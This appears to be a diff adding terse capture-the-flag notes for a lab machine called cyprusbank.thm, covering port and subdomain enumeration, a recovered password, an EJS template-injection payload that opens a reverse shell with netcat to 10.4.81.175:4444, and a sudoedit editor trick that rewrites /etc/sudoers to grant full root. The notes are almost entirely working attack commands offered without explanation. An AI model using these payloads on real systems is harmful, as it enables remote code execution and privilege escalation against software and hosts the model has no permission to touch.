@@ -1,0 +1,28 @@
+nmap -sC -sV -oN nmap 10.10.77.18 
+
+gobuster dir -u http://cyprusbank.thm/  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -o gobuster-enum
+
+ffuf -u http://cyprusbank.thm/ -H "Host: FUZZ.cyprusbank.thm" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,301,302,307,401,403,405,500 -fw 1 -t 50
+
+www.cyprusbank.thm
+admin.cyprusbank.thm
+
+PASS = p~]P@5!6;rs558:q
+user = Gayle Bev
+
+```
+ejs SSTI
+
+name=mohadeq&password=x&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 10.4.81.175 4444 -e bash');s
+```
+
+sudo -l
+(root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
+
+```
+export EDITOR="vi -- /etc/sudoers"
+echo $EDITOR
+```
+web = ALL=(ALL:ALL) NOPASSWD: ALL
+
+
